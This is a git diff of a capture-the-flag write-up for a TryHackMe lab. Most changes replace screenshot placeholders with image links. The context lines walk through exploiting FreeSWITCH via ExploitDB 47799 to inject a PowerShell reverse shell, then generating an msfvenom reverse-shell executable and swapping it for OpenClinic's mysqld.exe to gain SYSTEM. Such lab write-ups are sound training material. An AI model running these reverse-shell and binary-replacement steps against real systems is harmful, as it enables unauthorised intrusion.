@@ -30,7 +30,7 @@ nmap -sV -sC TARGET_IP
 
 This returns no results.
 
-***Insert Unsuccessful Nmap Scan Screenshot here***
+![Unsuccessful Nmap Scan Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Unsuccessful%20Nmap%20Screenshot.png)
 
 Let's add the ```-Pn``` option.
 
@@ -40,7 +40,7 @@ nmap -sV -sC -Pn TARGET_IP
 
 From the results, we can see that **port 3389 (RDP)** and **port 8021 (FreeSWITCH)** are open.
 
-***Insert Successful Nmap Scan Screenshot here***
+![Successful Nmap Scan Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Successful%20Nmap%20Scan%20Screenshot.png)
 
 ## Exploiting a FreeSWITCH Vulnerability
 
@@ -52,7 +52,7 @@ Let's try it out and see if it works:
 python3 /usr/share/exploitdb/exploits/windows/remote/47799.txt
 ```
 
-***Insert Unssuccesful FreeSWITCH Exploit Screenshot here***
+![Unssuccesful FreeSWITCH Exploit Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Unssuccesful%20FreeSWITCH%20Exploit%20Screenshot.png)
 
 We need to supply our target and then the command we want to run:
 
@@ -60,7 +60,7 @@ We need to supply our target and then the command we want to run:
 python3 /usr/share/exploitdb/exploits/windows/remote/47799.txt TARGET_IP whoami
 ```
 
-***Insert Succesful FreeSWITCH Exploit Screenshot here***
+![Succesful FreeSWITCH Exploit Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Successful%20FreeSWITCH%20Exploit%20Screenshot.png)
 
 ## Getting a Reverse Shell
 
@@ -72,7 +72,7 @@ To get this to run, we will utilize **Command Substitution**
 
 First, let's save the **PowerShell #2** reverse shell to a local file on our machine named ```reverse_shell.ps1```.
 
-***Insert reverse_shell.ps1 Screenshot here***
+![reverse_shell.ps1 Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/reverse_shell.ps1%20Screenshot.png)
 
 Next, let's start a Netcat listener on port 4444:
 
@@ -88,11 +88,11 @@ python3 /usr/share/exploitdb/exploits/windows/remote/47799.txt 10.64.186.121 "$(
 
 - The ```$(cat reverse_shell.ps1)``` command will read the contents of the PowerShell reverse shell script and pass it directly as an argument to the exploit.
 
-***Insert FreeSWITCH Exploit Reverse Shell Screenshot here****
+![FreeSWITCH Exploit Reverse Shell Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/FreeSWITCH%20Exploit%20Reverse%20Shell%20Screenshot.png)
 
-***Insert Successful Reverse Shell Screenshot here***
+![Successful Reverse Shell Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Successful%20Reverse%20Shell%20Screenshot.png)
 
-Our reverse shell worked, giving us an initial foothold to the system.
+Our reverse shell worked, giving us an initial foothold to the system!
 
 ## User Flag
 
@@ -102,21 +102,21 @@ After doing some searching on the system, I found the **user.txt** flag in the *
 Get-Content user.txt
 ```
 
-***Insert User Flag Screenshot here***
+![User Flag Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/User%20Flag%20Screenshot.png)
 
 There is also a root flag in this directory but we cannot access this without elevated privileges.
 
 ## Privilege Escalation
 
-In the ```C:\``` directory, there is an interesting directory named projects.
+In the ```C:\``` directory, there is an interesting directory named **projects**.
 
-***Insert C Directory Screenshot here***
+![C Directory Screenshot here](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/C%20Directory%20Screenshot.png)
 
-Within this directory, we see another directory named openclinic.
+Within this directory, we see another directory named **openclinic**.
 
-***Insert Projects Directory Screenshot here***
+![Projects Directory Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Projects%20Directory%20Screenshot.png)
 
-***Insert Openclinic Directory Screenshot here***
+![Openclinic Directory Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Openclinic%20Directory%20Screenshot.png)
 
 After some research, I found that OpenClinic is an open-source, hospital information management system.
 
@@ -124,11 +124,11 @@ I also found an OpenClinic **Privilege Escalation** exploit from [ExploitDB](htt
 
 ### Exploiting an OpenClinic Vulnerability
 
-It seems that any low privilege user can escalate their privileges by abusing the MariaDB service in OpenClinic. A low privilege account is able to rename mysqld.exe or tomcat8.exe files located in bin folders and replace them with a malicious file that would connect back to an attacking computer, giving system level privileges.
+[ExploitDB](https://www.exploit-db.com/exploits/50448) states, "*any low privilege user can escalate their privileges by abusing the MariaDB service in OpenClinic. A low privilege account is able to rename mysqld.exe or tomcat8.exe files located in bin folders and replace them with a malicious file that would connect back to an attacking computer, giving system level privileges.*"
 
 [ExploitDB](https://www.exploit-db.com/exploits/50448) gives us the following proof of concept steps to exploit this vulnerability:
 
-***Insert OpenClinic PoC Steps Screenshot here***
+![OpenClinic PoC Steps Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/OpenClinic%20PoC%20Steps%20Screenshot.png)
 
 Let's first generate our payload and store it in a directory that will later be hosted as a local web server:
 
@@ -138,7 +138,7 @@ cd web-server
 msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4242 -f exe > mysqld_evil.exe
 ```
 
-***Insert Generating Payload Screenshot here***
+![Generating Payload Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Generating%20Payload%20Screenshot.png)
 
 Let's serve this malicious executable on a web server:
 
@@ -147,7 +147,7 @@ cd web-server
 python3 -m http.server 8080
 ```
 
-***Insert Web Server Screenshot here***
+![Web Server Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Web%20Server%20Screenshot.png)
 
 On the victim machine, we need to download the malicious executable to the ```C:\projects\openclinic\mariadb\bin\``` directory:
 
@@ -161,9 +161,9 @@ Let's confirm:
 dir
 ```
 
-***Insert Downloading Malicious Executable Screenshot here***
+![Downloading Malicious Executable Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Downloading%20Malicious%20Executable%20Screenshot.png)
 
-***Insert Confirm Malicious Executable Screenshot Screenshot here***
+![Confirm Malicious Executable Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Confirm%20Malicious%20Executable%20Screenshot.png)
 
 Now we need to rename the real mysqld.exe to mysqld.bak:
 
@@ -171,7 +171,7 @@ Now we need to rename the real mysqld.exe to mysqld.bak:
 Move-Item mysqld.exe mysqld.bak
 ```
 
-***Insert Rename Real mysqld Screenshot here***
+![Rename Real mysqld Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Rename%20Real%20mysqld%20Screenshot.png)
 
 Let's confirm the rename:
 
@@ -179,7 +179,7 @@ Let's confirm the rename:
 dir
 ```
 
-***Insert Confirm mysqld Rename Screenshot here***
+![Confirm mysqld Rename Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Confirm%20mysqld%20Rename%20Screenshot.png)
 
 Now we need to rename the malicious mysqld_evil.exe to mysqld.exe:
 
@@ -187,7 +187,7 @@ Now we need to rename the malicious mysqld_evil.exe to mysqld.exe:
 Move-Item mysqld_evil.exe mysqld.exe
 ```
 
-***Insert Rename Malicious mysqld Screenshot here***
+![Rename Malicious mysqld Screenshot here](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Rename%20Malicious%20mysqld%20Screenshot.png)
 
 Let's confirm the rename:
 
@@ -195,7 +195,7 @@ Let's confirm the rename:
 dir
 ```
 
-***Insert Confirm Rename Malicious mysqld Screenshot here***
+![Confirm Rename Malicious mysqld Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Confirm%20Rename%20Malicious%20mysqld%20Screenshot.png)
 
 Let's start our Netcat Listener:
 
@@ -209,11 +209,11 @@ Now we need to restart the machine for our malicious executable to work:
 Restart-Computer
 ```
 
-***Insert Restart Computer Screenshot here***
+![Restart Computer Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Restart%20Computer%20Screenshot.png)
 
 After a few minutes, we have a reverse shell with system level privileges!
 
-***Insert System Level Reverse Shell Screenshot here***
+![System Level Reverse Shell Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/System%20Level%20Reverse%20Shell%20Screenshot.png)
 
 ## Root Flag
 
@@ -225,4 +225,4 @@ For some reason, ```Get-Content``` does not work like it did with the user flag.
 type root.txt
 ```
 
-***Insert Root Flag Screenshot here***
+![Root Flag Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Root%20Flag%20Screenshot.png)
